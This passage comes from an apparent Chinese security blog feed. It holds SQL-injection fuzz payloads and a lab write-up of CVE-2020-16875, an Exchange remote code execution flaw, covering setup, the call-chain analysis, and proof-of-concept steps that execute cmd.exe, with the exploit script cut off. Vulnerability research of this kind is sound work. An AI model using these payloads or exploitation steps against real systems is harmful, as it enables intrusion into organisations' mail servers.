回显下一个或上一个页面（整型判断）</li><li>and sleep(5) (判断页面返回时间)</li></ul><h2 id="0x04-注入检测"><a href="#0x04-注入检测" class="headerlink" title="0x04 注入检测"></a>0x04 注入检测</h2><h3 id="一、常见的注入点"><a href="#一、常见的注入点" class="headerlink" title="一、常见的注入点"></a>一、常见的注入点</h3><ul><li>GET/POST/PUT/DELETE参数</li><li>X-Forwarded-For</li><li>文件名</li></ul><h3 id="二、Fuzz注入点"><a href="#二、Fuzz注入点" class="headerlink" title="二、Fuzz注入点"></a>二、Fuzz注入点</h3><ul><li><code>&#39;</code> / <code>&quot;</code></li><li><code>1/1</code></li><li><code>1/0</code></li><li><code>and 1=1</code></li><li><code>&quot; and &quot;1&quot;=&quot;1</code></li><li><code>and 1=2</code></li><li><code>or 1=1</code></li><li><code>or 1=</code></li><li><code>&#39; and &#39;1&#39;=&#39;1</code></li><li><code>+</code> <code>-</code> <code>^</code> <code>*</code> <code>%</code> <code>/</code></li><li><code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>||</code> <code>|</code> <code>&amp;</code> <code>&amp;&amp;</code></li><li><code>~</code></li><li><code>!</code></li><li><code>@</code></li><li>反引号执行</li></ul><h3 id="三、测试用常量"><a href="#三、测试用常量" class="headerlink" title="三、测试用常量"></a>三、测试用常量</h3><ul><li><code>@@version</code></li><li><code>@@servername</code></li><li><code>@@language</code></li><li><code>@@spid</code></li></ul><h3 id="四、注释符"><a href="#四、注释符" class="headerlink" title="四、注释符"></a>四、注释符</h3><ul><li><code>#</code></li><li><code>--+</code></li><li><code>/*xxx*/</code></li><li><code>/*!xxx*/</code></li><li><code>/*!50000xxx*/</code></li></ul><h3 id="五、-判断过滤规则"><a href="#五、-判断过滤规则" class="headerlink" title="五、 判断过滤规则"></a>五、 判断过滤规则</h3><ul><li>是否有trunc</li><li>是否过滤某个字符</li><li>是否过滤关键字</li><li>slash和编码</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16875漏洞分析与复现</title>
      <link href="/2022/03/26/CVE-2020-16875%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/26/CVE-2020-16875%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-16875漏洞分析与复现"><a href="#CVE-2020-16875漏洞分析与复现" class="headerlink" title="CVE-2020-16875漏洞分析与复现"></a>CVE-2020-16875漏洞分析与复现</h1><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h2><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317195204247.png" alt="image-20220317195204247" style="zoom:50%;" /><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317195232845.png" alt="image-20220317195232845"></p><p>​    Microsoft Exchange Server 是个消息与协作系统。由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。</p><p>利用条件：<strong>利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。</strong></p><h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>我觉得这个漏洞的环境的配置是真的恶心了，这个exchange server真实配的我血压上升。</p><p><strong>虚拟机：win server 2016：</strong></p><p>​    内存最好8G或以上，CPU 4或以上，否则因为内存爆炸然后崩溃。</p><p><strong>SERVER：2016 CU16</strong></p><p>可以参考博客：<a href="https://saucer-man.com/information_security/748.html#cl-6">https://saucer-man.com/information_security/748.html#cl-6</a></p><h3 id="一、服务配置："><a href="#一、服务配置：" class="headerlink" title="一、服务配置："></a>一、服务配置：</h3><p>首先需要安装各种服务：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318140219204.png" alt="image-20220318140219204"></p><h3 id="二、官网下载iso"><a href="#二、官网下载iso" class="headerlink" title="二、官网下载iso"></a>二、官网下载iso</h3><p>在官网下载所需iso的文件，慢慢下。。。</p><h3 id="三、处理报错"><a href="#三、处理报错" class="headerlink" title="三、处理报错"></a>三、处理报错</h3><p>​    使用管理员用户运行iso下的<strong>setup.exe</strong>，没有什么特别的，按照自己的想法选，一直下一步，等待进度条慢的我想死…<img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318141055526.png" alt="image-20220318141055526"></p><p>​    然后开始处理报错（现在只剩一个了，原来有六个。。。），把这些报错全都处理掉就可以了。总体来说，解决方案就是点后面给的链接直接下，一个一个慢慢来。</p><p>​    期间安了十来个包，重启了六七次，我真是吐了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318144601332.png" alt="image-20220318144601332"></p><p>​    安装非常之慢，大概需要三个小时左右</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318165237797.png" alt="image-20220318165237797"></p><p>​    注意，内存一定要够大，否则就会像我一样白给。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317210232397.png" alt="image-20220317210232397"></p><p>​    先在官网上向前翻找到，漏洞产生时的更新版本，可以看到专门为这个漏洞更了一版，可见其危害，下载这一版本前一版，也就是未patch的相关版本文件，不过我们不是用户，所以也不需要做安全更新。</p><h3 id="四、处理w3wp-exe"><a href="#四、处理w3wp-exe" class="headerlink" title="四、处理w3wp.exe"></a>四、处理w3wp.exe</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319101342425.png" alt="image-20220319101342425"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319101349793.png" alt="image-20220319101349793"></p><p>可以看到w3wp杀疯了直接，我们需要对他做一些限制。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319104647853.png" alt="image-20220319104647853"></p><p>​    只能说好了一点，但是时不时的还会疯狂卡顿，目前没找到好的解决方案。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319104656061.png" alt="image-20220319104656061"></p><p>注意，此处还需要更改如下字段，否则会出现503错误：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319110623617.png" alt="image-20220319110623617"></p><p>终于，访问到了：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319111214876.png" alt="image-20220319111214876"></p><p>（密码就是电脑管理员账号密码）</p><h3 id="五、版本确认："><a href="#五、版本确认：" class="headerlink" title="五、版本确认："></a>五、版本确认：</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319120740412.png" alt="image-20220319120740412"></p><p>与官网进行对比：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>docs.microsoft.com<span class="operator">/</span>zh<span class="operator">-</span>cn<span class="operator">/</span>Exchange<span class="operator">/</span><span class="keyword">new</span><span class="operator">-</span>features<span class="operator">/</span>build<span class="operator">-</span>numbers<span class="operator">-</span><span class="keyword">and</span><span class="operator">-</span><span class="keyword">release</span><span class="operator">-</span>dates?<span class="keyword">view</span><span class="operator">=</span>exchserver<span class="number">-2019</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319120909484.png" alt="image-20220319120909484"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h3><p>下面对上文中我们在安装过程中遇到的新名词进行学习，本部分内容参考百度百科相关词条。</p><h4 id="1-iis："><a href="#1-iis：" class="headerlink" title="1.iis："></a>1.iis：</h4><p>互联网信息服务（英语：Internet Information Services,简称IIS），是由微软公司提供的基于运行Microsoft Windows的互联网基本服务,可以实现在windows上部署小型网站。</p><h4 id="2-NET"><a href="#2-NET" class="headerlink" title="2. .NET:"></a>2. .NET:</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/267f9e2f070828383f020665b299a9014c08f1b0" alt="img"></p><p>.NET框架（.NET Framework） 是由微软开发的网络软件开发平台，处在较为下层的位置，其是一个多语言组件开发和执行环境，它提供了一个跨语言的统一编程环境。.NET框架的目的是便于开发人员更容易地建立Web应用程序和Web服务，使得Internet上的各应用程序之间，可以使用Web服务进行沟通。</p><h4 id="3-exchange："><a href="#3-exchange：" class="headerlink" title="3.exchange："></a>3.exchange：</h4><p>Microsoft Exchange Server 是个消息与协作系统。Exchange server可以被用来构架应用于企业、学校的邮件系统或免费邮件系统，简单的说，他是一个基于.NET架构开发的一个软件。</p><h4 id="4-DLP"><a href="#4-DLP" class="headerlink" title="4.DLP"></a>4.DLP</h4><blockquote><p>​    防止数据丢失(Data loss Prevention)是Exchange Server 2013带来的一个新功能，感觉其实应该叫做防止数据泄露，许多第三方工具和设备也有类似的功能，而在Exchange 2013中直接集成了，并且之前的传输规则也整合到了一起。该功能通过对内容的深入分析，能够帮助企业识别、监控和保护敏感信息传递。</p><p>​    DLP通过关键字匹配、词典匹配、正则表达式的评估，和其他内容的检查，深入分析内容以发现组织内违法DLP规则的内容。一旦发现了违反了规则的内容，DLP会对用户进行提醒或者是组织，告知提醒用户邮件包含敏感内容或者违规传递。</p></blockquote><h3 id="二-基本情况概述"><a href="#二-基本情况概述" class="headerlink" title="二.基本情况概述"></a>二.基本情况概述</h3><p>​    在官网中，对于该漏洞的描述是：由于对 cmdlet 参数的验证不正确，Microsoft Exchange 服务器中存在远程执行代码漏洞。</p><p>​    其中又提到了一个我们不熟悉的词汇：<strong>cmdlet</strong>。cmdlet 是在 PowerShell 环境中使用的一种轻量级命令，其会执行操作，并且通常会向管道中的下一个命令返回一个 Microsoft .NET 对象。实际上根据我的查询理解，其就是powershell为用户设置的一个接口，开发、使用者可以通过cmdlet执行命令。</p><p>​    那么在exchange server中，专门为了避免数据丢失，设立了一个Data Loss Prevention角色，这个角色可以使用命令<strong>New-DlpPolicy</strong>来新建一个对于内容检查的政策，而该政策的参数中包括一个参数**-TemplateData**，由于对此参数没有进行任何过滤操作，系统会直接执行此参数传入的内容，导致代码执行漏洞（且是在system权限下的）。</p><h4 id="基础信息："><a href="#基础信息：" class="headerlink" title="基础信息："></a>基础信息：</h4><p>​    漏洞文件：<strong>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET\Files\ecp\App_Web_xxxx.dll</strong></p><p>​    漏洞函数：<strong>System.Web.UI.Page类，ProcessUpload()函数</strong></p><p>​    漏洞参数：**-TemplateData**</p><p>​    基础权限：<strong>Data Loss Prevention角色</strong></p><h3 id="三、漏洞原理分析"><a href="#三、漏洞原理分析" class="headerlink" title="三、漏洞原理分析"></a>三、漏洞原理分析</h3><p>在本部分中，我们选用<a href="%60https://github.com/0xd4d/dnSpy%60">dnspy</a>作为分析工具。<br>分析的相关步骤，思路，和部分图源参考：<a href="https://www.anquanke.com/post/id/219091?from=timeline%EF%BC%9B">https://www.anquanke.com/post/id/219091?from=timeline；</a></p><p><strong>总述：</strong>此漏洞核心问题是对cmdlet参数处理不当，或者说没有验证参数是否合法。不过该漏洞需要对应账户开启Data Loss Prevention角色，否则无法访问漏洞所在页面。</p><h4 id="1-aspx处理流程基础知识"><a href="#1-aspx处理流程基础知识" class="headerlink" title="1. aspx处理流程基础知识"></a>1. aspx处理流程基础知识</h4><blockquote><p>aspx文件是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF/124767">微软</a>的在服务器端运行的动态网页文件 [1] ,属于<a href="https://baike.baidu.com/item/ASP.NET%E6%8A%80%E6%9C%AF/14696255">ASP.NET技术</a>。ASP.NET是由微软在·NET Framework框架中所提供，开发Web应用程序的类库.</p><p>aspx文件是微软的在<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/3369401">服务器端</a>运行的<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5">动态网页</a>文件，而不像静态的html文件。它通过IIS解析执行后可以得到<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2">动态页面</a>，是微软推出的一种新的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B">网络编程</a>方法，而不是asp的简单升级，因为它的编程方法和asp有很大的不同，他是在服务器端靠服务器<a href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C">编译执行</a>的程序代码。</p></blockquote><p>摘自百度百科aspx词条。</p><p>​    在每一次http请求时，都会有一个<strong>HttpApplication</strong>类型的对象来管理这次请求的过程，同时创建一个<strong>HttpContext</strong>对象，前者负责装配出整个“<strong>HTTP请求处理管线（HTTP Pipeline）</strong>”也就是一条用于处理后者的流水线。<strong>HttpContext</strong>对象经过流水线的不同部分时，<strong>HttpApplication</strong>对象会先后激发出一连串的事件，在响应这些事件时，<strong>HttpContext</strong>对象被处理。处理了相关事件之后，<strong>HttpContext</strong>对象会最终被Page对象所接收，并成为<strong>Page</strong>类中的<strong>Context</strong>属性。</p><p>​    综上，每个被访问的<strong>ASP.NET</strong>页面都会被转换为一个“<strong>派生自Page类的页面类”</strong>。</p><p>​    然后呢，在Page类中，实现了<strong>IHttpHandler</strong>接口，此接口定义了一个<strong>ProcessRequest()<strong>方法。</strong>ASP.NET</strong>页面类生成以后被自动编译为程序集，然后其<strong>ProcessRequest()<strong>方法被自动调用。</strong>ProcessRequest()<strong>方法 的执行结果再次被</strong>HttpContext</strong>对象所承载，控制又转回到“HTTP请求处理流水线”中，<strong>HttpApplication</strong>对象继续激发后继的事件。这时，如果还有特定的HTTP模块响应这些事件，则它们会被自动调用。</p><pre><code> 综上，ASP.NET页面会被转化为一个页面类后，自动调用**ProcessRequest()**方法进行处理。</code></pre><h4 id="2-dnspy调试前折磨"><a href="#2-dnspy调试前折磨" class="headerlink" title="2.dnspy调试前折磨"></a>2.dnspy调试前折磨</h4><p>​    那么，由于我们在浏览器上访问了ManagePolicyFromISV.aspx页面，aspx文件在.NET Framework下运行一般会在<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\ecp\</code>路径中生成App_Web_xxxx.dll，我们可以这些有可能的dll拖入dnSpy工具中，并找到负责处理ManagePolicyFromISV.aspx页面的类。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326215522930.png" alt="image-20220326215522930"></p><p>​    从如下的dll中一个一个寻找，突出的就是一个痛苦。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326215841501.png" alt="image-20220326215841501">    找到了！我们进入ProcessRequest函数中，可以看到这个函数调用了另一个ProcessRequest函数，我们双击进入，进入的是进入<strong>System.Web.UI.Page</strong>类中的**public virtual void ProcessRequest(HttpContext context)**函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220025760.png" alt="image-20220326220025760"></p><p>上图函数开始处下个断点：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220152717.png" alt="image-20220326220152717"></p><p>好了，现在我们可以开始动态调试了！</p><p>在这个时候，我们会面临一个问题，我们要调试哪一个进程：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326214314069.png" alt="image-20220326214314069"></p><p>此时可以通过上图中的命令，找到我们要调试的进程<strong>MSExchangeECPAppPool</strong>，附加到该进程上    </p><h4 id="3-dnspy分析函数调用链"><a href="#3-dnspy分析函数调用链" class="headerlink" title="3.dnspy分析函数调用链"></a>3.dnspy分析函数调用链</h4><p>​    中间单步的代码逻辑此处略过不表</p><pre><code> 一步步调试，我们可以发现，进入`System.Web.UI.Page`类的`ProcessRequest()`函数后，之后又会来到`ProcessRequestMain()`函数。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220622446.png" alt="image-20220326220622446">    然后，<code>ProcessRequestMain()</code>又会调用<code>LoadRecursive()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220738065.png" alt="image-20220326220738065"><code>LoadRecursive()</code>根据对象的不同，又会进入不同的处理方法,对于我们的这了dlp策略，程序最终会进入<code>Microsoft.Exchange.Management.ControlPanel.DLPISVService</code>类中的<code>ExecuteUpload()</code>函数中，该函数很快调用了<code>PSCommand()</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/t013a814c82e57d23ca.png" alt="img"></p><p>（此图源自：<a href="https://www.anquanke.com/post/id/219091?from=timeline%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E6%89%93%E5%BC%80%E8%B0%83%E7%94%A8%E5%A0%86%E6%A0%88%EF%BC%89">https://www.anquanke.com/post/id/219091?from=timeline，因为我不知道怎么打开调用堆栈）</a></p><p>从调用堆栈中，可以看到函数调用的顺序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.DLPISVService.ProcessUpload(Microsoft.Exchange.Management.ControlPanel.DLPPolicyUploadParameters parameters) (IL=<span class="number">0x0006</span>, Native=<span class="number">0x00007FFF99CF4E50</span>+<span class="number">0x15</span>)</span><br><span class="line">     Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.ExecuteUpload() (IL≈<span class="number">0x00CE</span>, Native=<span class="number">0x00007FFF99CF48A0</span>+<span class="number">0x298</span>)</span><br><span class="line">     Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.OnLoad(System.EventArgs e) (IL=epilog, Native=<span class="number">0x00007FFF99CE4410</span>+<span class="number">0x10C</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Control.LoadRecursive() (IL≈<span class="number">0x0011</span>, Native=<span class="number">0x00007FFFE5E53100</span>+<span class="number">0x100</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequestMain(<span class="keyword">bool</span> includeStagesBeforeAsyncPoint, <span class="keyword">bool</span> includeStagesAfterAsyncPoint) (IL=<span class="number">0x04C3</span>, Native=<span class="number">0x00007FFFE5E61250</span>+<span class="number">0xEC9</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest(<span class="keyword">bool</span> includeStagesBeforeAsyncPoint, <span class="keyword">bool</span> includeStagesAfterAsyncPoint) (IL=<span class="number">0x003C</span>, Native=<span class="number">0x00007FFFE5E60FF0</span>+<span class="number">0x9F</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest() (IL≈<span class="number">0x0014</span>, Native=<span class="number">0x00007FFFE5E60F60</span>+<span class="number">0x4B</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest(System.Web.HttpContext context) (IL=epilog, Native=<span class="number">0x00007FFFE5E60EE0</span>+<span class="number">0x46</span>)</span><br><span class="line">     App_Web_ojcsje1s.dll!ASP.dlppolicy_managepolicyfromisv_aspx.ProcessRequest(System.Web.HttpContext context) (IL=<span class="number">0x0007</span>, Native=<span class="number">0x00007FFF99CDD310</span>+<span class="number">0x2D</span>)</span><br></pre></td></tr></table></figure><p>最后，我们的参数parameters将会被传给<code>New-DLPPolicy</code>这个<code>cmdlet</code>中，然后直接被执行。</p><p>​    总结一下函数的调用链，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326205544078.png" alt="image-20220326205544078"></p><p>分析过后，我们已经对调用流程非常了解了，下面我们需要分析调用最后一步出现的参数。</p><h4 id="4-cmdlet分析"><a href="#4-cmdlet分析" class="headerlink" title="4.cmdlet分析"></a>4.cmdlet分析</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326221348607.png" alt="image-20220326221348607"></p><p>也就是最后一步调用中使用PSCommand函数中名为<strong>New-DLPPolicy</strong>的这个<strong>cmdlet</strong>：</p><p>对于其详细的解释，我们直接访问<a href="https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps">微软官网该词条</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326221811945.png" alt="image-20220326221811945"></p><p>​    <em>此cmdlet可在本地Exchange和基于云的服务中使用，使用DlpPolicy cmdlet可以在您的Exchange组织中创建数据丢失防护(DLP)策略</em>。在下方参数列表中，我们发现参数 **[-TemplateData &lt;Byte[]&gt;]**，这与刚刚我们调试中看到的内容是一致的！</p><p>往下看：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326222046349.png" alt="image-20220326222046349"></p><p>也就是呢，我们可以使用<strong>New-DLPPolicy</strong>作为一条命令，其中有一条参数，是我们所能够控制的参数。</p><p>那从用户的角度来看，我们的传入点在哪呢？</p><p>​    在<a href="https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help">官网</a>找到上文中提到的dlp处理机制文件上传模板如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dlpPolicyTemplate</span> <span class="attr">id</span>=<span class="string">&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;Audit&quot;</span> <span class="attr">state</span>=<span class="string">&quot;Enabled&quot;</span> <span class="attr">version</span>=<span class="string">&quot;15.0.2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contentVersion</span>&gt;</span>4<span class="tag">&lt;/<span class="name">contentVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publisherName</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">publisherName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>PCI-DSS<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Detects the presence of information subject to Payment Card Industry Data Security Standard (PCI-DSS) compliance requirements.<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">keywords</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>&gt;</span><span class="tag">&lt;/<span class="name">ruleParameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ruleParameters</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- The contents below are applied/executed as rules directly in PS - --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ new-transportRule &quot;PCI-DSS: Monitor Payment Card Information Sent To Outside&quot; -DlpPolicy &quot;%%DlpPolicyName%%&quot; -SentToScope NotInOrganization -SetAuditSeverity High -MessageContainsDataClassifications @&#123;Name=&quot;Credit Card Number&quot;; MinCount=&quot;1&quot; &#125; -Comments &quot;Monitors payment card information sent to outside the organization as part of the PCI-DSS DLP Policy.&quot;]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[ new-transportRule &quot;PCI-DSS: Monitor Payment Card Information Sent To Within&quot; -DlpPolicy &quot;%%DlpPolicyName%%&quot; -Comments &quot;Monitors payment card information sent inside the organization as part of the PCI-DSS DLP Policy.&quot; -SentToScope InOrganization -SetAuditSeverity Low -MessageContainsDataClassifications @&#123;Name=&quot;Credit Card Number&quot;; MinCount=&quot;1&quot; &#125; ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">commandBlock</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policyCommands</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">policyCommandsResources</span>&gt;</span><span class="tag">&lt;/<span class="name">policyCommandsResources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dlpPolicyTemplate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    可以看到，在<strong>&lt;commandBlock&gt;<strong>标签中，我们可以使用MSExchange提供的一条cmdlet：</strong>new-transportRule</strong>，这条cmdlet最终会被送入刚刚提到的<strong>PSCommand</strong>函数调用的<strong>New-DLPPolicy cmdlet</strong>的-<strong>TemplateData</strong>中得到执行，但是此过程中没有进行任何的校验！</p><p>​    因此，我们猜测，也可以直接提供一条powershell的cmdlet，该cmdlet最终也会被执行。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="一、手动利用poc流程"><a href="#一、手动利用poc流程" class="headerlink" title="一、手动利用poc流程"></a>一、手动利用poc流程</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322104712473.png" alt="image-20220322104712473"></p><p>新建用户：密码为Cve16875</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322104428000.png" alt="image-20220322104428000"></p><p>在靶机服务器打开<code>Exchange Management Shell</code>，执行代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-RoleGroup</span> <span class="literal">-Name</span> <span class="string">&quot;dlp users&quot;</span> <span class="literal">-Roles</span> <span class="string">&quot;Data Loss Prevention&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="built_in">Get-RoleGroup</span> <span class="string">&quot;dlp users&quot;</span> | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322110527767.png" alt="image-20220322110527767"></p><p>手动执行：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322134903135.png" alt="image-20220322134903135"></p><p>上传poc.xml文件。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220322135008945.png" alt="image-20220322135008945"></p><p>可以看到我们执行了cmd.exe，证明poc是可行的。</p><h3 id="二、脚本进行poc"><a href="#二、脚本进行poc" class="headerlink" title="二、脚本进行poc"></a>二、脚本进行poc</h3><p>上述过程总体还是比较繁琐，我们可以将其转化为脚本一键执行</p><p>执行脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./poc.py <span class="number">192.168</span>.<span class="number">6.143</span> hello@cve16875.com:Cve16875 cmd.exe</span><br></pre></td></tr></table></figure><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 